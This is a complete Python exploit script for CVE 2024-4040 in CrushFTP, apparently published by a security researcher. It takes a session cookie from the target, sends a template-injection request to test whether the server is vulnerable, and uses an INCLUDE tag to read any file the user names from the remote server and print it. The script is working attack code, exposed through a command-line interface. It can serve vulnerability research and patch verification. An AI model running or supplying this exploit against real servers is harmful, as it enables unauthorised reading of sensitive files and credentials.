#!/usr/bin/python3

import requests
import argparse

def check_vulnerability(url):
    try:
        sess = requests.Session()
        sess.get(url)
        currentAuth = sess.cookies['currentAuth']
        print("[*] Checking vulnerability for URL:", url)

        response = sess.get(f"{url}/WebInterface/function/?command=zip&c2f="+currentAuth+"&path={{user_name}}&names=*")
        if "anonymous" in response.text:
            print(f"[+] URL: {url} is vulnerable to CVE 2024-4040")
            return True
        else:
            print("[-] Not vulnerable!")
            return False
    except Exception as e:
        print(f"Error occured: ", e)
        return False

def do_include_file_command(url, filename):
    check_vulnerability(url)
    print("[*] Attempting to read file:", filename)
    try:
        sess = requests.Session()
        sess.get(url)
        currentAuth = sess.cookies['currentAuth']
        response = sess.get(f"{url}/WebInterface/function/?command=zip&c2f="+currentAuth+f"&path=<INCLUDE>{filename}</INCLUDE>&names=*")
        if filename in response.text:
            print("[!] Filename found in response, the requested file may not exist")
            print(response.text)
        else:
            print(response.text)
        return True
    except Exception as e:
        print(f"Error occured: ", e)
        return False

def main():
    parser = argparse.ArgumentParser(description="Script to check for vulnerability and perform LFI on CrushFTP.")
    parser.add_argument("--check", action="store_true", help="Check if the remote instance is vulnerable or not")
    parser.add_argument("--lfi", metavar="FILENAME", help="Include a file from the remote instance")
    parser.add_argument("--url", required=True, help="Base URL of the CrushFTP instance")

    args = parser.parse_args()
    print("-"*0x30)
    print("Exploit for CVE 2024-4040 - CrushFTP SSTI Vulnerability")
    print("Author: D4mianWayne (Robin)")
    print("Blog: https://d4mianwayne.github.io\n")
    print("-"*0x30 + "\n")

    if args.check:
        check_vulnerability(args.url)

    if args.lfi:
        do_include_file_command(args.url, args.lfi)

if __name__ == '__main__':
    main()
